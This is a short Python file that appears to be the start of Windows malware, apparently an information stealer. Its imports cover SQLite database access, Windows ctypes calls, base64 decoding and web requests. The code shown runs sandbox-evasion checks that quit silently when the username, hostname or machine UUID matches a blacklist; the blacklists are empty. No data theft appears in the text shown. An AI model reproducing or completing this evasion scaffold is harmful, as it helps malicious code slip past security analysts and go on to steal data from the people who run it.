import os
import threading
from sys import executable
from sqlite3 import connect as sql_connect
import re
from base64 import b64decode
from json import loads as json_loads, load
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from urllib.request import Request, urlopen
from json import *
import time
import shutil
from zipfile import ZipFile
import random
import re
import subprocess
import sys
import shutil
import uuid
import socket
import getpass
import ssl



#Username Blacklist
blacklistUsers = []

username = getpass.getuser()

if username.lower() in blacklistUsers:
    os._exit(0)
#hostname Blacklist
def control():

    blacklistUsername = []

    hostname = socket.gethostname()

    if any(name in hostname for name in blacklistUsername):
        os._exit(0)

control()

#UUID Blacklist
BLACKLIST1 = []

mac_address = uuid.getnode()
if str(uuid.UUID(int=mac_address)) in BLACKLIST1:
    os._exit(0)